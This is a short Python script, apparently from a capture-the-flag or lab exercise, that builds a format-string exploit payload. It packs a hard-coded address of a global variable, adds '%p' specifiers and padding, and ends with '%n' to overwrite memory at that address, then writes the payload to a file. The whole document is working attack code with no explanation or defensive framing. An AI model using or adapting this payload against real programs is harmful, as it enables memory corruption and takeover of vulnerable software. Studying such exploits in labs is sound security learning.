import struct

var_address = 0x0804988c #address of the global value
padding = 31

# Create the payload
payload = struct.pack('I', var_address)
payload += b" %p" * 3
payload += b" " * padding
payload += b" %n"

# Save the payload to a file
with open('payload', 'wb') as f:
    f.write(payload)
